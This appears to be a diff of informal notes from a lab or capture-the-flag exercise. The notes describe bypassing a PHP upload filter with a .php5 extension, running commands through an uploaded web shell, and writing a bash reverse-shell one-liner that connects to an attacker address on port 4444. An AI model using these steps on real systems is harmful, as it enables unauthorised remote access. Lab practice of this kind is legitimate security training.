@@ -13,3 +13,5 @@ i tried pentesting moneky php testing in order to change the php to php 4 5 6 et
 http://10.10.227.63/uploads/phpreverse.php5?c=ls in the url 
 in order to move from the php interface to a bash format i will --->
 10.10.227.63/uploads/phpreverse.php5?c= echo 'sh -i >& /dev/tcp/10.8.126.176/4444 0>&1' > revershell.sh
+revershell.sh was created in the url containing the code #sh -i >& /dev/tcp/10.8.126.176/4444 0>&1#
+
